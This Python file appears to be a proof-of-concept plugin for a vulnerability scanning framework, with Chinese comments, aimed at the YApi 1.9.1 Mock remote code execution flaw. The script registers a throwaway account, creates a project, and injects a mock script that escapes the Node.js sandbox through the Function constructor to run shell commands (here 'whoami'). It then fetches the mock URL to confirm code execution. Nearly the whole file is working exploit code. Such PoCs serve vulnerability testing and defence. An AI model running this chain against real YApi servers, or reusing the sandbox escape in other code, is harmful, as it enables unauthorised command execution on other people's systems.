from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight,req     # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin          # 导入其他的脚本需要用到的模块
#要用到的模块
from re import findall
from random import choice
from string import digits
from json import dumps
from requests import session as Session


POC_NAME = "YApiRemoteCodeExecute"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class YApiRemoteCodeExecute(BasePoc):

    # PoC实现类，需继承BasePoc
    # 为PoC填充poc_info、scan_info、test_case三个字典中的基本信息

    # 随机生成8位数字用于注册用户
    id = "".join(map(lambda x:choice(digits), range(8)))
    header = {
        "User-Agent": "Mozilla/5.0 (Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
        "Content-Type": "application/json;charset=utf-8",
        "Accept": "application/json, text/plain, */*",
        "X-Forwarded-For": "127.0.0.1"
    }
    poc_info = {
        'poc': {
            'Id': 'vb_2021_0015',    # PoC的VID编号
            'vbid': '',
            'Name': 'YApi Remote Code Execute',    # PoC名称
            'Author': 'atsud0',    # PoC作者
            'Create_date': '2021-7-14',    # PoC创建时间
            },

        'vul': {
            'Product': 'YApi',    # 漏洞所在产品名称
            'Version': '1.9.1',    # 产品的版本号
            'Type': 'RCE',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                YAPI接口管理平台是国内某旅行网站的大前端技术中心开源项目，
                使用mock数据/脚本作为中间交互层，
                为前端后台开发与测试人员提供更优雅的接口管理服务，
                该系统被国内较多知名互联网企业所采用.
                YApi 是高效、易用、功能强大的 api 管理平台。
                但因为大量用户使用 YAPI的默认配置并允许从外部网络访问
                YApi服务，导致攻击者注册用户后，即可通过Mock功能远程执行任意代码
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-07-14',    # PoC公布时间
        }
    }

    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }

    # 注册账号
    def register(self,url):
        path = '/api/user/reg'
        url = urljoin(url,path)
        data = {
            "email":f"{self.id}@test.com",
            "password":f"{self.id}",
            "username":f"{self.id}"
        }
        try:
            resp = req(url,'post',headers=self.header,data=dumps(data))
            if resp.status_code == 200 and "成功！" in resp.text:
                highlight(f'Email:{self.id}@test.com\r\nPasswd:{self.id}')
                return True
            else:
                highlight(f'Faild to register\r\nError:{resp.text}')
                return False
        except Exception as e:
            print(e)

    # 创建项目
    def Add_Project(self,url,session,Group_Id):
        Add_Project_Url = urljoin(url,'/api/project/add')
        data = {
            "name":f"test{self.id}",
            "basepath":f"/test{self.id}",
            "group_id":f"{Group_Id}",
            "icon":"code-o",
            "color":"pink",
            "project_type":"private"
        }
        try:
            resp = session.post(Add_Project_Url,headers=self.header,data=dumps(data))
            Project_Id = int("".join(findall('"tag":\[\],"_id":(.*?),"__v',resp.text)))
            return Project_Id
        except:
            return False

    # 写入Mock脚本
    def Mock_Up(self,url,session,Project_Id):
        Mock_Up_Url = urljoin(url,'/api/project/up')

        data = {
            "id": Project_Id,
            "project_mock_script":"const sandbox = this\nconst ObjectConstructor = this.constructor\nconst FunctionConstructor = ObjectConstructor.constructor\nconst myfun = FunctionConstructor('return process')\nconst process = myfun()\nmockJson = process.mainModule.require(\"child_process\").execSync(\"whoami\").toString()",
            "is_mock_open":True
        }

        try:
            highlight('Write Mock')
            resp = session.post(Mock_Up_Url,headers=self.header,data=dumps(data))
            if resp.status_code == 200:
                return resp.text
        except Exception as e:
            print(e)
            return False

    def Add_Interface(self,url,session,Project_Id):
        Cat_Id_Url = urljoin(url,f'/api/project/get?id={Project_Id}')
        Add_Interface_Url = urljoin(url,'/api/interface/add')

        resp = session.get(Cat_Id_Url,headers=self.header)
        Cat_Id = int("".join(findall('"index":.*,"_id":(.*?),"name"',resp.text)))

        data = {
            "method": 'GET',
            'catid': Cat_Id,
            'title': f'test{self.id}',
            'path': f'/test{self.id}',
            "project_id": Project_Id
        }

        resp = session.post(Add_Interface_Url,data=dumps(data),headers=self.header)

        InterFace_Id = int("".join(findall('.*,"_id":(.*?),"__v"',resp.text)))
        InterFace_Up_Url = urljoin(url,'/api/interface/up')

        data = {
            "id": InterFace_Id,
            'status': "done"
        }

        resp = session.post(InterFace_Up_Url,data=dumps(data),headers=self.header)
        if resp.status_code == 200:
            return True

    def login(self,url):
        login_url = urljoin(url,'/api/user/login')
        data = {
            "email": f"{self.id}@test.com",
            "password":f"{self.id}"
        }
        session = Session()
        resp = session.post(login_url,headers=self.header,data=dumps(data))

        if resp.status_code == 200 and "logout success" in resp.text:
            highlight("Login successful get the project id now")
            Get_GroupId_Url = urljoin(url, '/api/group/get_mygroup')
            resp = session.get(Get_GroupId_Url, headers=self.header)
            Group_Id = int("".join(findall('_id":(.*?),',resp.text)))
            # 创建项目
            Project_Id = self.Add_Project(url, session, Group_Id)

            if self.Mock_Up(url,session,Project_Id):
                self.Add_Interface(url,session,Project_Id)
                Vuln_Url = urljoin(url,f'/mock/{Project_Id}/test{self.id}/test{self.id}')
                highlight(f'The Vuln_url:{Vuln_Url}\r\nExecute whoami')
                resp = req(Vuln_Url,'get',headers=self.header)
                return resp.text
            else:
                return False

    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", True)   # 是否打印详细信息

        # 以下是PoC的检测逻辑
        if self.register(target):
            context=self.login(target)

            if context == False:
                return False

        if 'root' in context:
            highlight(context)
            self.scan_info['Success'] = True
            self.scan_info['Ret']['VerifyInfo']['URL'] = target
            self.scan_info['Ret']['VerifyInfo']['DATA'] = context
            if verbose:
                highlight('[*] YApi RCE Found !')
        else:
            if verbose:
                highlight('[*] YApi RCE Not Found !')

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)